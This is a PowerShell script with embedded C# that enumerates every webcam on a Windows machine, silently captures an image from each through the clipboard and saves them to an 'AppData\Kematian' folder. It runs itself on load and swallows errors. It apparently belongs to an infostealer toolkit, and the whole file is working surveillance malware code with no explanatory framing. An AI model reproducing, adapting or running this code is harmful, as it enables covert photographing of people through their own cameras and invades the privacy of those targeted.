function Get-WebCamImage {
    $source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Collections;
    using System.Windows.Forms;

    namespace WebCamLib
    {
        public class Device
        {
            private const int WM_CAP = 0x400;
            private const int WM_CAP_DRIVER_CONNECT = 0x40a;
            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;
            private const int WM_CAP_EDIT_COPY = 0x41e;
            private const int WM_CAP_SET_PREVIEW = 0x432;
            private const int WM_CAP_SET_PREVIEWRATE = 0x434;
            private const int WM_CAP_SET_SCALE = 0x435;
            private const int WS_CHILD = 0x40000000;
            private const int WS_VISIBLE = 0x10000000;

            [DllImport("avicap32.dll")]
            protected static extern int capCreateCaptureWindowA(ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);

            [DllImport("user32.dll")]
            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, int lParam);

            [DllImport("user32.dll")]
            protected static extern bool SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

            [DllImport("user32.dll")]
            protected static extern bool DestroyWindow(int hwnd);

            private int index;
            private int deviceHandle;

            public Device(int index)
            {
                this.index = index;
            }

            public string Name { get; set; }
            public string Version { get; set; }

            public void Init(int windowHeight, int windowWidth, int handle)
            {
                string deviceIndex = Convert.ToString(this.index);
                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0);

                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0)
                {
                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0);
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0);
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0);
                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6);
                }
            }

            public void ShowWindow(System.Windows.Forms.Control windowsControl)
            {
                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());
            }

            public void CopyC()
            {
                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);
            }

            public void Stop()
            {
                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0);
                DestroyWindow(deviceHandle);
            }
        }

        public class DeviceManager
        {
            [DllImport("avicap32.dll")]
            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
                int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

            static ArrayList devices = new ArrayList();

            public static Device[] GetAllDevices()
            {
                string dName = "".PadRight(100);
                string dVersion = "".PadRight(100);

                for (short i = 0; i < 10; i++)
                {
                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100))
                    {
                        Device d = new Device(i);
                        d.Name = dName.Trim();
                        d.Version = dVersion.Trim();
                        devices.Add(d);
                    }
                }

                return (Device[])devices.ToArray(typeof(Device));
            }

            public static Device GetDevice(int deviceIndex)
            {
                return (Device)devices[deviceIndex];
            }
        }
    }
"@
    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms

    try {
        $pngcodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq "PNG" }
        $devices = [WebCamLib.DeviceManager]::GetAllDevices()
        $count = 0
        foreach ($device in $devices) {
            $imagePath = "$env:APPDATA\Kematian\out$count.png"
            $picCapture = New-Object System.Windows.Forms.PictureBox
            $device.ShowWindow($picCapture)
            $device.CopyC()
            $bitmap = [System.Windows.Forms.Clipboard]::GetImage()
            $bitmap.Save($imagePath, $pngcodec, $ep)
            $bitmap.Dispose()
            [System.Windows.Forms.Clipboard]::Clear()
            $count++
        }
    }
    catch {
     Write-Host "[!] No camera found" -ForegroundColor Red
    }
}
try {Get-WebCamImage}catch {}
